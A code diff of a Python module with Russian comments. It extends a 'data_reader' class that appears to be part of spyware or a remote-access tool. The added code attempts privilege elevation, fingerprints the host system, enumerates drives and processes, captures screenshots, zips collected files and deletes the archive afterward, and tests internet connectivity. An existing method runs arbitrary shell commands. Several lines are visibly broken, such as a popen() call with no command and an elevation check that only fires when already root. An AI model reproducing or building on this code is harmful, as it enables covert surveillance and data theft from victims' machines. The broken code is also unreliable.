@@ -1,22 +1,26 @@
-from os.path import relpath
-from os import system, walk
-from subprocess import getstatusoutput
-from re import search
-from json import dumps
-from zipfile import ZipFile
+from os.path import relpath # папка проекта
+from os import walk, popen, remove # список файлов, список процессов, удаление файлов
+from subprocess import getstatusoutput # выполнение команд
+from re import search # рег. выражения
+from json import dumps # сохранение даннх в json
+from zipfile import ZipFile # Архивирование файлов
+from platform import uname # Информация о системе
+from pyautogui import screenshot # скрины
+from urllib.request import urlopen # запросы к сайту
+# Повышение прав
 try:
-    import os
+    from os import getuid
     from elevate import elevate
 
     def is_root():
-        return os.getuid() == 0
+        return getuid() == 0
 
     if is_root():
       elevate()
 except:
     pass
 try:
-  import win32api
+  import win32api # Получение информации о жёстких лисках
 except:
   pass
 
@@ -24,12 +28,20 @@ class data_reader:
     def __init__(self):
         try:
             self.path = relpath(__file__)
+            self.LogicalDrives = self.path.split(':\\') + ':\\'
         except:
             pass
         try:
             self.LogicalDrives = tuple(win32api.GetLogicalDriveStrings().split("\x00")[:-1])
         except:
             pass
+
+        platform = uname()
+        self.platform = dumps({'system': platform.system + ' ' + platform.version,
+                         'machine': platform.machine,
+                         'processor': platform.processor,
+                         'node': platform.node})
+
     def cmd(self, command:str) -> str:
         try:
             getstatusoutput('../'*100 + ';' + command)[1]
@@ -122,11 +134,34 @@ class data_reader:
                     file.write(a)
 
             with open('0.zip', 'rb') as file:
-                return file.read()
+                res = file.read()
+
+            remove('0.zip')
+            return res
         except:
             return ''
     def procces_list(self):
-        return self.cmd('chcp 1251 | tasklist /v').split('\n')
+        PIDs = popen().read()
+
+        return PIDs
+
+    def screeshot(self):
+        return screenshot()
+
+    def internet_test(self):
+        try:
+            urlopen('https://ya.ru')
+            return True
+        except IOError:
+            try:
+                urlopen('https://google.com')
+                return True
+            except IOError:
+                return False
+            except:
+                return None
+        except:
+            return None
 
 def format_test(file_name: str, formats=tuple()) -> bool:
     try:
